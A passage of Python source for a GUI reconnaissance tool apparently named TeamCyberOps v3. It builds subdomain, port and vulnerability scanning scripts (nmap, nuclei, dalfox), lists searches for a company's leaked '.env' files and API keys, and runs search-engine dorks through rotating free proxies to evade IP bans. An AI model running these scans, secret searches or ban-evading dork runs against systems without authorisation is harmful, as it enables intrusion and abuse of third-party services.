                f"cat $OUT_DIR/subfinder.txt $OUT_DIR/amass.txt $OUT_DIR/crtsh.txt | sort -u > $OUT_DIR/all_subs.txt",
                f"echo '[+] Subdomains:' $(wc -l < $OUT_DIR/all_subs.txt)",
                f"",
                f"# ── Phase 2: DNS Resolution ──",
                f"dnsx -l $OUT_DIR/all_subs.txt -silent -a -resp -o $OUT_DIR/resolved.txt",
                f"echo '[+] Alive DNS:' $(wc -l < $OUT_DIR/resolved.txt)",
                f"",
                f"# ── Phase 3: HTTP Probe ──",
                f"httpx -l $OUT_DIR/resolved.txt -silent -status-code -title -tech-detect -o $OUT_DIR/alive_http.txt",
                f"echo '[+] HTTP alive:' $(wc -l < $OUT_DIR/alive_http.txt)",
                f"",
                f"# ── Phase 4: Port Scan (Top 1000) ──",
                f"nmap -iL $OUT_DIR/resolved.txt -T4 --open -sV -oN $OUT_DIR/nmap.txt 2>/dev/null",
                f"",
                f"# ── Phase 5: URL Discovery ──",
                f"cat $OUT_DIR/alive_http.txt | awk '{{print $1}}' | gau --threads 5 > $OUT_DIR/gau_urls.txt",
                f"cat $OUT_DIR/alive_http.txt | awk '{{print $1}}' | waybackurls > $OUT_DIR/wayback_urls.txt",
                f"katana -l $OUT_DIR/alive_http.txt -d 3 -silent -o $OUT_DIR/katana_urls.txt",
                f"cat $OUT_DIR/gau_urls.txt $OUT_DIR/wayback_urls.txt $OUT_DIR/katana_urls.txt | sort -u > $OUT_DIR/all_urls.txt",
                f"echo '[+] Total URLs:' $(wc -l < $OUT_DIR/all_urls.txt)",
                f"",
                f"# ── Phase 6: Parameter Discovery ──",
                f"cat $OUT_DIR/all_urls.txt | grep '=' | sort -u > $OUT_DIR/params.txt",
                f"cat $OUT_DIR/all_urls.txt | gf xss > $OUT_DIR/xss_candidates.txt",
                f"cat $OUT_DIR/all_urls.txt | gf sqli > $OUT_DIR/sqli_candidates.txt",
                f"cat $OUT_DIR/all_urls.txt | gf ssrf > $OUT_DIR/ssrf_candidates.txt",
                f"",
                f"# ── Phase 7: Vulnerability Scan (Smart) ──",
                f"nuclei -l $OUT_DIR/alive_http.txt -severity medium,high,critical -silent -o $OUT_DIR/nuclei.txt",
                f"dalfox file $OUT_DIR/xss_candidates.txt --silence --no-color -o $OUT_DIR/xss_results.txt",
                f"subzy run --targets $OUT_DIR/all_subs.txt --concurrency 20 > $OUT_DIR/takeover.txt",
                f"",
                f"# ── Phase 8: Screenshots ──",
                f"gowitness file -f $OUT_DIR/alive_http.txt --screenshot-path $OUT_DIR/screenshots/ 2>/dev/null",
                f"",
                f"# ── Summary ──",
                f"echo '================================='",
                f"echo 'Recon Complete for: $TARGET'",
                f"echo 'Subdomains: '$(wc -l < $OUT_DIR/all_subs.txt)",
                f"echo 'HTTP Alive: '$(wc -l < $OUT_DIR/alive_http.txt)",
                f"echo 'URLs:       '$(wc -l < $OUT_DIR/all_urls.txt)",
                f"echo 'Vulns:      '$(wc -l < $OUT_DIR/nuclei.txt)",
                f"echo 'XSS:        '$(wc -l < $OUT_DIR/xss_results.txt)",
                f"echo '================================='",
            ]
            for line in lines: self._ra_txt.insert('end', line+'\n')
            self._ra_txt.config(state='disabled')

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        mk_btn(bf, "⚡ Generate Oneliners", gen_oneliners, GREEN).pack(side='left', padx=4, ipady=4)
        mk_btn(bf, "📋 Copy All", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self._ra_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save Script", lambda: self._save_text(self._ra_txt.get('1.0','end')), FG2, small=True).pack(side='left', padx=4)
        gen_oneliners()

    def _build_acquisition_intel(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "ACQUISITION INTEL — Find ALL Company Assets", "🎯").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Large companies own many acquired companies — each is a separate attack surface\n"
            "  Technique: ASN → All IP ranges → Reverse DNS → Hidden domains\n"
            "  Also: GitHub org search, job postings, LinkedIn tech stack hints"
        ), bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=12, pady=8)
        tvar, _ = self._tor_shared_target(pad)
        self._acq_txt = mk_stext(pad, h=24, bg=BG3, fg=FG)
        self._acq_txt.pack(fill='both', expand=True, pady=(0,8))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        def run_acq():
            domain = tvar.get().strip()
            if not domain: return
            company = domain.split('.')[0]
            self._acq_txt.config(state='normal'); self._acq_txt.delete('1.0','end')
            self._acq_txt.insert('end', f"[*] Acquisition Intel for: {domain}\n\n")
            self._acq_txt.insert('end', f"=== EXPANSION VECTORS ===\n\n")
            self._acq_txt.insert('end', f"1. CRUNCHBASE ACQUISITIONS:\n")
            self._acq_txt.insert('end', f"   https://www.crunchbase.com/organization/{company}/acquisitions\n\n")
            self._acq_txt.insert('end', f"2. ASN → ALL IP RANGES:\n")
            self._acq_txt.insert('end', f"   amass intel -org '{company}' -whois\n")
            self._acq_txt.insert('end', f"   # Gets all ASNs registered to company\n\n")
            self._acq_txt.insert('end', f"3. REVERSE IP → HIDDEN DOMAINS:\n")
            self._acq_txt.insert('end', f"   # For each IP in ASN range:\n")
            self._acq_txt.insert('end', f"   dig -x <IP> +short\n")
            self._acq_txt.insert('end', f"   curl https://api.hackertarget.com/reverseiplookup/?q=<IP>\n\n")
            self._acq_txt.insert('end', f"4. GITHUB ORG SEARCH:\n")
            self._acq_txt.insert('end', f"   https://github.com/{company}\n")
            self._acq_txt.insert('end', f"   Search: org:{company} filename:.env\n")
            self._acq_txt.insert('end', f"   Search: org:{company} api_key\n\n")
            self._acq_txt.insert('end', f"5. SHODAN ORG SEARCH:\n")
            self._acq_txt.insert('end', f"   shodan search 'org:\"{company}\"' --fields ip_str,port,hostnames\n\n")
            self._acq_txt.insert('end', f"6. LINKEDIN TECH HINTS:\n")
            self._acq_txt.insert('end', f"   https://www.linkedin.com/jobs/search/?keywords={company}+security+engineer\n")
            self._acq_txt.insert('end', f"   Job postings reveal tech stack (AWS, Kubernetes, Spring, etc.)\n\n")
            self._acq_txt.insert('end', f"7. CERTIFICATE TRANSPARENCY (all domains):\n")
            self._acq_txt.insert('end', f"   curl -s 'https://crt.sh/?q={company}&output=json' | jq -r '.[].name_value' | grep -v '*' | sort -u\n\n")
            self._acq_txt.insert('end', f"8. MOBILE APPS (hidden API endpoints):\n")
            self._acq_txt.insert('end', f"   # Download APK from APKPure/APKMirror\n")
            self._acq_txt.insert('end', f"   apktool d app.apk && grep -r 'api\\|endpoint\\|http' app/\n")
            self._acq_txt.insert('end', f"   strings app.apk | grep -E 'https?://'\n\n")
            self._acq_txt.config(state='disabled')
            # Open Crunchbase
            webbrowser.open(f"https://www.crunchbase.com/organization/{company}/acquisitions")
            self.set_status(f"Acquisition intel for {company} generated", GREEN)
        mk_btn(bf, "🎯 Generate Acquisition Intel", run_acq, GREEN).pack(side='left', padx=4, ipady=4)
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self._acq_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)

    # ═════════════════════════════════════════════════════════════
    #  DORK RUNNER TAB — CLI Dork Execution with Proxy Support
    # ═════════════════════════════════════════════════════════════
    def _build_dork_runner(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1  = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  🌐 Proxy Manager  ")
        f2  = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  🚀 Run Dorks  ")
        f3  = tk.Frame(nb2, bg=BG2); nb2.add(f3, text="  📊 Results  ")
        self._build_proxy_manager(f1)
        self._build_dork_executor(f2)
        self._build_dork_results(f3)

    # ─── PROXY MANAGER ────────────────────────────────────────────
    def _build_proxy_manager(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "FREE PROXY MANAGER — Auto-Fetch & Test", "🌐").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,10))
        tk.Label(info, text=(
            "  Fetches free proxies from multiple sources (ProxyList, FreeProxy, GeoNode, ProxyScrape)\n"
            "  Tests each proxy → only keeps working ones (HTTP 200 received)\n"
            "  Working proxies used automatically by Dork Runner"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        # Controls
        cr = mk_frame(pad, bg=BG2); cr.pack(fill='x', pady=(0,8))
        tk.Label(cr, text="Test URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._proxy_test_url = tk.StringVar(value="http://httpbin.org/ip")
        mk_entry(cr, var=self._proxy_test_url, w=30).pack(side='left', padx=8, ipady=3)
        tk.Label(cr, text="Timeout:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        self._proxy_timeout = tk.StringVar(value="8")
        ttk.Combobox(cr, textvariable=self._proxy_timeout,
                     values=["5","8","10","15"], width=4, font=MONO_S).pack(side='left')
        tk.Label(cr, text="Threads:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        self._proxy_threads = tk.StringVar(value="30")
        ttk.Combobox(cr, textvariable=self._proxy_threads,
                     values=["10","20","30","50"], width=4, font=MONO_S).pack(side='left')

        # Proxy type filter
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='x', pady=(0,8))
        tk.Label(tf, text="Types:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._proxy_http_var   = tk.BooleanVar(value=True)
        self._proxy_https_var  = tk.BooleanVar(value=True)
        self._proxy_socks4_var = tk.BooleanVar(value=False)
        self._proxy_socks5_var = tk.BooleanVar(value=False)
        for text, var in [("HTTP", self._proxy_http_var), ("HTTPS", self._proxy_https_var),
                          ("SOCKS4", self._proxy_socks4_var), ("SOCKS5", self._proxy_socks5_var)]:
            ttk.Checkbutton(tf, text=text, variable=var).pack(side='left', padx=8)

        # Status
        self._proxy_status_lbl = tk.Label(pad, text="No proxies loaded", bg=BG2, fg=FG3, font=MONO_S)
        self._proxy_status_lbl.pack(anchor='w', pady=(0,6))

        # Proxy list tree
        cols = ('Protocol','Host','Port','Country','Latency','Status')
        self._proxy_tree = mk_tree(pad, columns=cols, show='headings', height=16)
        for c, w in [('Protocol',70),('Host',140),('Port',55),('Country',70),('Latency',80),('Status',80)]:
            self._proxy_tree.heading(c, text=c, anchor='w')
            self._proxy_tree.column(c, width=w, anchor='w')
        self._proxy_tree.tag_configure('working', foreground=GREEN, background=BG3)
        self._proxy_tree.tag_configure('failed',  foreground=RED, background=BG3)
        self._proxy_tree.tag_configure('testing', foreground=YELLOW, background=BG3)
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._proxy_tree.yview)
        self._proxy_tree.configure(yscrollcommand=vsb.set)
        tf2 = mk_frame(pad, bg=BG2); tf2.pack(fill='both', expand=True)
        self._proxy_tree.pack(side='left', fill='both', expand=True, in_=tf2)
        vsb.pack(side='right', fill='y', in_=tf2)

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(8,0))
        mk_btn(bf, "🌐 Fetch Proxies from Internet", self._fetch_proxies, ACCENT).pack(side='left', padx=4, ipady=5)
        mk_btn(bf, "✅ Test All Proxies", self._test_proxies, GREEN, small=True).pack(side='left', padx=4)
        mk_btn(bf, "📋 Copy Working", self._copy_working_proxies, FG2, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save Working", self._save_working_proxies, FG2, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🗑 Clear All", lambda: (
            self._proxy_tree.delete(*self._proxy_tree.get_children()),
            setattr(self, '_proxies', []),
            self._proxy_status_lbl.config(text="Cleared", fg=FG3)
        ), RED, small=True).pack(side='left', padx=4)
        self._proxies = []

    def _fetch_proxies(self):
        """Fetch free proxies from multiple sources."""
        self._proxy_status_lbl.config(text="⏳ Fetching proxies...", fg=CYAN)
        self._proxy_tree.delete(*self._proxy_tree.get_children())
        self._proxies = []

        def _go():
            import urllib.request as _ur, json as _json, re as _re
            all_proxies = []

            # Source 1: ProxyScrape API
            sources = [
                ("http", "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&simplified=true"),
                ("http", "https://www.proxy-list.download/api/v1/get?type=http"),
                ("https","https://www.proxy-list.download/api/v1/get?type=https"),
                ("http", "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"),
                ("socks5","https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"),
                ("http", "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"),
            ]

            # Type filter
            want_http   = self._proxy_http_var.get()
            want_https  = self._proxy_https_var.get()
            want_socks4 = self._proxy_socks4_var.get()
            want_socks5 = self._proxy_socks5_var.get()

            for proto, url in sources:
                if proto == 'http' and not want_http: continue
                if proto == 'https' and not want_https: continue
                if proto == 'socks4' and not want_socks4: continue
                if proto == 'socks5' and not want_socks5: continue
                try:
                    req = _ur.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    with _ur.urlopen(req, timeout=10) as r:
                        text = r.read().decode("utf-8", errors="replace")
                    # Parse IP:PORT format
                    matches = _re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{2,5})', text)
                    for host, port in matches:
                        try:
                            p = int(port)
                            if 1 <= p <= 65535:
                                all_proxies.append((proto, host, port))
                        except Exception: pass
                except Exception: pass

            # Also try GeoNode API (JSON)
            try:
                gn_url = "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps"
                req = _ur.Request(gn_url, headers={"User-Agent": "Mozilla/5.0"})
                with _ur.urlopen(req, timeout=10) as r:
                    data = _json.loads(r.read())
                for item in data.get("data", []):
                    host = item.get("ip","")
                    port = str(item.get("port",""))
                    proto = (item.get("protocols",["http"])[0] if item.get("protocols") else "http")
                    country = item.get("country","")
                    if host and port:
                        all_proxies.append((proto, host, port, country))
            except Exception: pass

            # Deduplicate
            seen = set()
            unique = []
            for p in all_proxies:
                key = f"{p[1]}:{p[2]}"
                if key not in seen:
                    seen.add(key)
                    unique.append(p)

            self._proxies = [{"proto": p[0], "host": p[1], "port": p[2],
                               "country": p[3] if len(p)>3 else "—",
                               "latency": "—", "status": "untested"} for p in unique]

            def _upd():
                self._proxy_tree.delete(*self._proxy_tree.get_children())
                for prx in self._proxies:
                    self._proxy_tree.insert('', 'end', values=(
                        prx['proto'].upper(), prx['host'], prx['port'],
                        prx['country'], prx['latency'], prx['status']
                    ), tags=('testing',))
                self._proxy_status_lbl.config(
                    text=f"✅ {len(self._proxies)} proxies fetched — click 'Test All' to verify", fg=GREEN)
                self.set_status(f"Fetched {len(self._proxies)} proxies", GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _test_proxies(self):
        """Test all fetched proxies concurrently."""
        if not self._proxies:
            messagebox.showinfo("No Proxies", "Fetch proxies first!", parent=self.root); return
        try:
            timeout = int(self._proxy_timeout.get())
            n_threads = int(self._proxy_threads.get())
        except Exception:
            timeout, n_threads = 8, 30

        test_url  = self._proxy_test_url.get().strip() or "http://httpbin.org/ip"
        total     = len(self._proxies)
        tested    = [0]; working = [0]
        lock      = threading.Lock()
        self._proxy_status_lbl.config(text=f"⏳ Testing {total} proxies...", fg=CYAN)

        def _test_one(prx):
            import urllib.request as _ur, time as _time
            proxy_str = f"{prx['proto']}://{prx['host']}:{prx['port']}"
            start = _time.time()
            try:
                handler = _ur.ProxyHandler({prx['proto']: proxy_str,
                                             'http': proxy_str, 'https': proxy_str})
                opener  = _ur.build_opener(handler)
                opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
                req = _ur.Request(test_url)
                with opener.open(req, timeout=timeout) as resp:
                    body = resp.read(200).decode('utf-8', errors='replace')
                    code = resp.status
                elapsed = int((_time.time() - start) * 1000)
                if code == 200:
                    prx['status']  = 'working'
                    prx['latency'] = f"{elapsed}ms"
                    with lock: working[0] += 1
                else:
                    prx['status'] = f"HTTP {code}"
            except Exception:
                prx['status'] = 'failed'
                prx['latency'] = '—'
            with lock:
                tested[0] += 1
                # Update UI every 5 proxies
                if tested[0] % 5 == 0 or tested[0] == total:
                    snap_tested  = tested[0]
                    snap_working = working[0]
                    snap_prx     = self._proxies.copy()
                    def _upd(t=snap_tested, w=snap_working, pr=snap_prx):
                        self._proxy_tree.delete(*self._proxy_tree.get_children())
                        # Show working first
                        for p in sorted(pr, key=lambda x: (0 if x['status']=='working' else 1)):
                            tag = 'working' if p['status']=='working' else ('failed' if p['status']=='failed' else 'testing')
                            self._proxy_tree.insert('', 'end', values=(
                                p['proto'].upper(), p['host'], p['port'],
                                p['country'], p['latency'], p['status']
                            ), tags=(tag,))
                        self._proxy_status_lbl.config(
                            text=f"Testing: {t}/{total}  |  ✅ Working: {w}", fg=CYAN)
                    self.root.after(0, _upd)

        # Launch threads
        sem = threading.Semaphore(n_threads)
        def _worker(p):
            with sem: _test_one(p)
        threads = [threading.Thread(target=_worker, args=(p,), daemon=True)
                   for p in self._proxies]
        for t in threads: t.start()

        def _wait():
            for t in threads: t.join()
            w = sum(1 for p in self._proxies if p['status'] == 'working')
            self.root.after(0, lambda: (
                self._proxy_status_lbl.config(
                    text=f"✅ Done! {w}/{total} proxies working", fg=GREEN if w else RED),
                self.set_status(f"Proxy test complete: {w} working proxies", GREEN if w else RED)
            ))
        threading.Thread(target=_wait, daemon=True).start()

    def _get_working_proxies(self) -> list:
        return [p for p in getattr(self, '_proxies', []) if p.get('status') == 'working']

    def _copy_working_proxies(self):
        working = self._get_working_proxies()
        if not working: return
        lines = [f"{p['proto']}://{p['host']}:{p['port']}" for p in working]
        self.root.clipboard_clear(); self.root.clipboard_append('\n'.join(lines))
        self.set_status(f"Copied {len(working)} working proxies", GREEN)

    def _save_working_proxies(self):
        working = self._get_working_proxies()
        if not working: return
        proj     = self.project.get() or "default"
        proj_dir = LOGS_DIR / proj
        proj_dir.mkdir(parents=True, exist_ok=True)
        out = proj_dir / "working_proxies.txt"
        with open(out, 'w') as f:
            f.write('\n'.join(f"{p['proto']}://{p['host']}:{p['port']}" for p in working))
        self.set_status(f"Saved {len(working)} proxies → {out}", GREEN)

    # ─── DORK EXECUTOR ─────────────────────────────────────────────
    def _build_dork_executor(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "DORK RUNNER — CLI Automated Dorking", "🚀").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,10))
        tk.Label(info, text=(
            "  Executes dorks category-by-category using curl through working proxies\n"
            "  Only saves results with HTTP 200 responses  •  Output → logs/<project>/dork_results.txt\n"
            "  Proxy rotation: cycles through working proxies per request to avoid IP bans"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        # Config
        r1 = mk_frame(pad, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text="Target:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._runner_target = tk.StringVar(value=self.project.get() or "")
        mk_entry(r1, var=self._runner_target, w=30).pack(side='left', padx=8, ipady=3)
        mk_btn(r1, "← Project", lambda: self._runner_target.set(self.project.get()), FG3, small=True).pack(side='left')

        r2 = mk_frame(pad, bg=BG2); r2.pack(fill='x', pady=(0,6))
        tk.Label(r2, text="Engine:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._runner_engine = tk.StringVar(value="google")
        for eng, clr in [("google", YELLOW), ("shodan", RED), ("censys", CYAN), ("github", PURPLE)]:
            ttk.Radiobutton(r2, text=eng.capitalize(), variable=self._runner_engine, value=eng).pack(side='left', padx=8)

        r3 = mk_frame(pad, bg=BG2); r3.pack(fill='x', pady=(0,6))
        tk.Label(r3, text="Category:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._runner_cat = tk.StringVar(value="ALL")
        self._runner_cat_cb = ttk.Combobox(r3, textvariable=self._runner_cat,
                                            values=["ALL"], width=36, font=MONO_S)
        self._runner_cat_cb.pack(side='left', padx=8)
        mk_btn(r3, "🔄 Load Categories", self._runner_load_cats, FG3, small=True).pack(side='left', padx=4)

        r4 = mk_frame(pad, bg=BG2); r4.pack(fill='x', pady=(0,6))
        tk.Label(r4, text="Delay (sec):", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._runner_delay = tk.StringVar(value="2")
        ttk.Combobox(r4, textvariable=self._runner_delay,
                     values=["1","2","3","5","10"], width=4, font=MONO_S).pack(side='left', padx=8)
        self._runner_use_proxy = tk.BooleanVar(value=True)
        ttk.Checkbutton(r4, text="Use Proxies (rotate per request)", variable=self._runner_use_proxy).pack(side='left', padx=16)
        self._runner_only_200 = tk.BooleanVar(value=True)
        ttk.Checkbutton(r4, text="Only save HTTP 200 results", variable=self._runner_only_200).pack(side='left', padx=8)

        # Progress
        self._runner_progress_lbl = tk.Label(pad, text="  Ready — configure above and click Start",
                                              bg=BG2, fg=FG3, font=('Consolas', 9))
        self._runner_progress_lbl.pack(anchor='w', pady=(0,4))
        self._runner_log = tk.Text(pad, height=18, bg='#020408', fg=GREEN,
                                    font=('Consolas', 9), relief='flat', bd=0,
                                    state='disabled', wrap='none',
                                    insertbackground=ACCENT, padx=10, pady=8,
                                    selectbackground=BG5, selectforeground=FG)
        # Horizontal scrollbar for long dork lines
        hsb_run = ttk.Scrollbar(pad, orient='horizontal', command=self._runner_log.xview)
        vsb_run = ttk.Scrollbar(pad, orient='vertical',   command=self._runner_log.yview)
        self._runner_log.configure(xscrollcommand=hsb_run.set, yscrollcommand=vsb_run.set)
        log_frame = mk_frame(pad, bg=BG2); log_frame.pack(fill='both', expand=True)
        self._runner_log.pack(side='left', fill='both', expand=True, in_=log_frame)
        vsb_run.pack(side='right', fill='y', in_=log_frame)
        hsb_run.pack(fill='x', pady=(0,8))

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        self._runner_btn = mk_btn(bf, "🚀 Start Dork Runner", self._start_dork_runner, GREEN)
        self._runner_btn.pack(side='left', padx=4, ipady=6)
        self._runner_stop = tk.BooleanVar(value=False)
        mk_btn(bf, "⬛ Stop", lambda: self._runner_stop.set(True), RED, small=True).pack(side='left', padx=4)
        mk_btn(bf, "📊 View Results", lambda: self._goto_tab("Dorks"), FG2, small=True).pack(side='left', padx=4)

    def _runner_load_cats(self):
        engine = self._runner_engine.get()
        cats_map = {
            "google": dorks_module.GOOGLE_DORK_CATEGORIES,
            "shodan": dorks_module.SHODAN_DORK_CATEGORIES,
            "censys": dorks_module.CENSYS_DORK_CATEGORIES,
            "github": dorks_module.GITHUB_DORK_CATEGORIES,
        }
        cats = list(cats_map.get(engine, {}).keys())
        self._runner_cat_cb['values'] = ["ALL"] + cats
        self._runner_cat.set("ALL")
        self.set_status(f"Loaded {len(cats)} categories for {engine}", GREEN)

    def _rlog(self, msg, tag='info'):
        """Log to dork runner terminal with colored formatting."""
        COLOR_MAP = {
            'ok':   GREEN,    # ✅ success / found links
            'err':  RED,      # ❌ fail / error
            'warn': YELLOW,   # ⏸ rate limit / category header
            'info': CYAN,     # [*] header lines
            'dim':  FG3,      # separator / skip / link
        }
        clr = COLOR_MAP.get(tag, FG)
        if hasattr(self, '_runner_log'):
            self._runner_log.config(state='normal')
            self._runner_log.insert('end', msg + '\n', tag)
            self._runner_log.tag_config(tag, foreground=clr,
                                         font=('Consolas', 9))
            self._runner_log.see('end')
            self._runner_log.config(state='disabled')

    def _start_dork_runner(self):
        target = self._runner_target.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Enter a target domain first", parent=self.root); return
        engine   = self._runner_engine.get()
        cat_sel  = self._runner_cat.get()
        use_prx  = self._runner_use_proxy.get()
        only_200 = self._runner_only_200.get()
        try: delay = float(self._runner_delay.get())
        except Exception: delay = 2.0

        self._runner_stop.set(False)
        self._runner_log.config(state='normal'); self._runner_log.delete('1.0','end')
        self._runner_log.config(state='disabled')

        # Get dorks
        cats_map = {
            "google": dorks_module.GOOGLE_DORK_CATEGORIES,
            "shodan": dorks_module.SHODAN_DORK_CATEGORIES,
            "censys": dorks_module.CENSYS_DORK_CATEGORIES,
            "github": dorks_module.GITHUB_DORK_CATEGORIES,
        }
        all_cats = cats_map.get(engine, {})
        if cat_sel == "ALL":
            dorks_to_run = [(cat, dork.replace("{target}", target))
                            for cat, dlist in all_cats.items()
                            for dork in dlist]
        else:
            dorks_to_run = [(cat_sel, dork.replace("{target}", target))
                            for dork in all_cats.get(cat_sel, [])]

        if not dorks_to_run:
            messagebox.showwarning("No Dorks", "No dorks found. Load categories first.", parent=self.root); return

        # Working proxies
        working_proxies = list(self._get_working_proxies()) if use_prx else []

        # ── Header ─────────────────────────────────────────────────
        def _header():
            sep = "─" * 60
            self._rlog(f"  {sep}", 'dim')
            self._rlog(f"  ⬡  DORK RUNNER  —  TeamCyberOps v3", 'info')
            self._rlog(f"  {sep}", 'dim')
            self._rlog(f"  [*]  Engine    {engine.upper()}", 'info')
            self._rlog(f"  [*]  Target    {target}", 'info')
            self._rlog(f"  [*]  Dorks     {len(dorks_to_run)}  ({cat_sel})", 'info')
            self._rlog(f"  [*]  Proxies   {len(working_proxies)} working", 'info')
            self._rlog(f"  [*]  Delay     {delay}s  │  Only 200: {only_200}", 'dim')
            self._rlog(f"  {sep}", 'dim')
            self._rlog(f"  {'ICON':<4}  {'DORK':<54}  STATUS", 'dim')
            self._rlog(f"  {sep}", 'dim')
        self.root.after(0, _header)

        def _run():
            import urllib.request as _ur, urllib.parse as _up
            import time as _time, itertools as _it, json as _json

            results     = []     # {dork, url, status, title, snippet}
            proxy_cycle = _it.cycle(working_proxies) if working_proxies else None
            proxy_idx   = [0]   # mutable for inner function
            build_url   = {
                "google": dorks_module.build_google_url,
                "shodan": dorks_module.build_shodan_url,
                "censys": dorks_module.build_censys_url,
                "github": dorks_module.build_github_url,
            }.get(engine, dorks_module.build_google_url)

            # ── Proxy-aware fetch with HTTPS tunnel fix ────────────
            def _fetch(url, retries=3):
                """
                Fetch URL through proxy with proper HTTPS CONNECT tunnel.
                Rotates proxy on each retry. Falls back to direct if all fail.
                """
                last_err = None
                for attempt in range(retries):
                    prx = None
                    if proxy_cycle and working_proxies:
                        prx = next(proxy_cycle)
                        proxy_idx[0] = (proxy_idx[0] + 1) % max(1, len(working_proxies))
                        # Build proxy URL — use http:// proxy for CONNECT tunnel
                        px_url = f"http://{prx['host']}:{prx['port']}"
                        try:
                            # Use urllib ProxyHandler — sets up CONNECT tunnel for HTTPS
                            proxy_support = _ur.ProxyHandler({
                                'http':  px_url,
                                'https': px_url,
                            })
                            opener = _ur.build_opener(proxy_support)
                            opener.addheaders = [(
                                'User-Agent',
                                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                'AppleWebKit/537.36 (KHTML, like Gecko) '
                                'Chrome/120.0.0.0 Safari/537.36'
                            )]
                            resp = opener.open(url, timeout=12)
                            body = resp.read(4000).decode('utf-8', errors='replace')
                            return resp.status, body, prx
                        except Exception as e:
                            last_err = str(e)
                            # Mark this proxy as bad and try next
                            if prx in working_proxies:
                                try: working_proxies.remove(prx)
                                except Exception: pass
                            continue
                    else:
                        # Direct (no proxy)
                        try:
                            req = _ur.Request(url, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                              'AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
                            })
                            with _ur.urlopen(req, timeout=12) as r:
                                body = r.read(4000).decode('utf-8', errors='replace')
                                return r.status, body, None
                        except Exception as e:
                            last_err = str(e)
                            break
                return None, None, last_err

            # ── Stats counters ─────────────────────────────────────
            stats       = {'ok': 0, 'skip': 0, 'fail': 0, 'links': 0}
            last_cat    = [None]

            for idx, (cat, dork) in enumerate(dorks_to_run):
                if self._runner_stop.get():
                    self.root.after(0, lambda: self._rlog("", 'dim'))
                    self.root.after(0, lambda: self._rlog("  ⬛  Stopped by user", 'warn'))
                    break

                search_url = build_url(dork)
                pct  = int((idx + 1) / len(dorks_to_run) * 100)
                prog = (f"  [{idx+1:3d}/{len(dorks_to_run)}]  {pct:3d}%  │  "
                        f"✅{stats['ok']}  ⏭{stats['skip']}  ❌{stats['fail']}  "
                        f"🔗{stats['links']}  │  {cat[:28]}")
                self.root.after(0, lambda p=prog: (
                    self._runner_progress_lbl.config(text=p, fg=CYAN),
                    self.set_status(p, CYAN)
                ))

                # Category header separator
                if cat != last_cat[0]:
                    last_cat[0] = cat
                    self.root.after(0, lambda c=cat:
                        self._rlog(f"\n  ── {c} {'─'*max(1,48-len(c))}", 'warn'))

                # ── Execute ────────────────────────────────────────
                status, body, prx_or_err = _fetch(search_url)

                if status is None:
                    # All proxies failed → show trimmed error
                    err_short = str(prx_or_err)
                    # Clean common long SSL/tunnel errors
                    for noise in ['<urlopen error ', 'Tunnel connection failed', '_ssl.c:', '>', '<']:
                        err_short = err_short.replace(noise, '')
                    err_short = err_short.strip()[:45]
                    stats['fail'] += 1
                    self.root.after(0, lambda d=dork[:52], e=err_short:
                        self._rlog(f"  ❌  {d:<53}  {e}", 'err'))
                    _time.sleep(delay * 0.5)
                    continue

                if status == 429:
                    stats['skip'] += 1
                    self.root.after(0, lambda d=dork[:52]:
